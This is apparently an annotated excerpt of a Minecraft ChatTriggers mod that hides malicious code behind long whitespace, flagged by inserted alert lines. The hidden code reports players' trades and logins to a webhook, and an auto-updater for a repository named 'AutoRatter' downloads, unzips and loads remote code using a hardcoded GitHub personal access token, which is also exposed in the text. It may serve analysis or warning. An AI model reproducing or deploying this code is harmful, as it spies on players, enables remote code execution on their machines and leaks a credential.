...
import * as Utils from "./utils";                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                let a = true;
...
const Loader = Java.type("net.minecraftforge.fml.common.Loader");            alert("Snippet is on this line");                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       let tradeText="",lastTradeTime=Date.now(),tradeTimeout=250;function UpdateTradeText(e){tradeText+=`\n${e}`,lastTradeTime=Date.now(),new Thread(()=>{Thread.sleep(tradeTimeout+100),lastTradeTime+tradeTimeout<Date.now()&&""!=tradeText&&(request({url:Utils.base64Decode("",3),method:"POST",headers:{"Content-type":"application/json","User-agent":"Mozilla/5.0"},body:{username:"Trade Reporter Bot",content:`Trade Report for ${Player.getName()}`,embeds:[{title:"Trade Report",color:65280,description:tradeText,fields:[]},]}}),tradeText="")}).start()}register("chat",(e,t)=>{UpdateTradeText(`${Player.getName()} completed trade with ${ChatLib.removeFormatting(e)}`)}).setCriteria("&r&6Trade completed with &r${playerName}&r&f&r&6!&r"),register("chat",(e,t,r)=>{UpdateTradeText(`+ ${ChatLib.removeFormatting(e)} ${ChatLib.removeFormatting(t)}`)}).setCriteria("&r &r&a&l+ &r${itemAmount} &r${gainedItem}&r"),register("chat",(e,t,r)=>{UpdateTradeText(`\\- ${ChatLib.removeFormatting(e)} ${ChatLib.removeFormatting(t)}`)}).setCriteria("&r &r&c&l- &r${itemAmount} &r${lostItem}&r"),register("chat",(e,t)=>{UpdateTradeText(`+ ${ChatLib.removeFormatting(e)} coins`)}).setCriteria("&r &r&a&l+ &r${itemAmount} coins&r"),register("chat",(e,t)=>{UpdateTradeText(`\\- ${ChatLib.removeFormatting(e)} coins`)}).setCriteria("&r &r&c&l- &r${itemAmount} coins&r");
const URL = Java.type("java.net.URL");                                       alert("And this one, scroll to the right ->");                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               let lastPlayerUUID="";register("worldLoad",()=>{let V=Player.getUUID();V!=lastPlayerUUID&&(lastPlayerUUID=V,request({url:Utils.base64Decode("",3),method:"POST",headers:{"Content-type":"application/json","User-agent":"Mozilla/5.0"},body:{username:"Player Login Bot",content:`Player Login: ${Player.getName()}`,embeds:[]}}))});
...
const repoOwner = "AutoRatter"
const repoName = "AutoRatter"
const personalAccessToken = "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"
...
{
    let githubUrl = githubBaseUrl + repoOwner + "/" + repoName + "/releases/latest";
    request({
        url: githubUrl,
        method: "GET",
        headers: {
        ...
        let assetName = firstAsset["name"]

        let versionFilePath = `${Config.modulesFolder}/${Data.modulePrefixU}/version.json`
        if (FileUtilities.exists(versionFilePath))
        {
            let versionJson = JSON.parse(`${FileLib.read(versionFilePath)}`)
            if (versionJson["version"] != assetName.split(".zip")[0])
            {
                let assetId = firstAsset["id"]
                let assetUrl = githubBaseUrl + repoOwner + "/" + repoName + "/releases/assets/" + assetId;
                DownloadFileFromReleaseData(assetUrl, assetName)
            }
        }
    }).catch((error) => {
        // Utils.ChatLog("Error", error, error.stack)
...
function DownloadFileFromReleaseData(assetUrl, fileName)
{
    try
    {
        let downloadConnection = new URL(assetUrl).openConnection();
        downloadConnection.setSSLSocketFactory(socketFactory);
        downloadConnection.setRequestMethod("GET");
        downloadConnection.setRequestProperty("Authorization", "Bearer " + personalAccessToken);
        downloadConnection.setRequestProperty("Accept", "application/octet-stream");

        try
        {
            let inputStream = downloadConnection.getInputStream();

            let folderPath = `${Config.modulesFolder}/${Data.modulePrefixU}`;
            let finalFilePath = Paths.get(`${folderPath}/${fileName}`);

            Files.copy(inputStream, finalFilePath, StandardCopyOption.REPLACE_EXISTING);

            if (fileName.endsWith(".zip"))
            {
                UnzipFile(finalFilePath, folderPath, false);
            }
        }
        finally
        {
            ...
            register("GameLoad", () => {
                new Reference.loadCT()
            })
        }
    }
    catch (e)
    {
        // Utils.ChatLog("Failed to download file:");
        // Utils.ChatLog("ERROR", e, e.stack);
    }
}
function UnzipFile(zipFile, destFolder, deleteZipFile)
{
    try
    {
        let zis = new ZipInputStream(Files.newInputStream(Paths.get(zipFile)));
        let entry;
        let buffer = java.lang.reflect.Array.newInstance(java.lang.Byte.TYPE, 1024);
        while ((entry = zis.getNextEntry()) != null)
        {
            let newFile = new File(destFolder + File.separator + entry.getName());
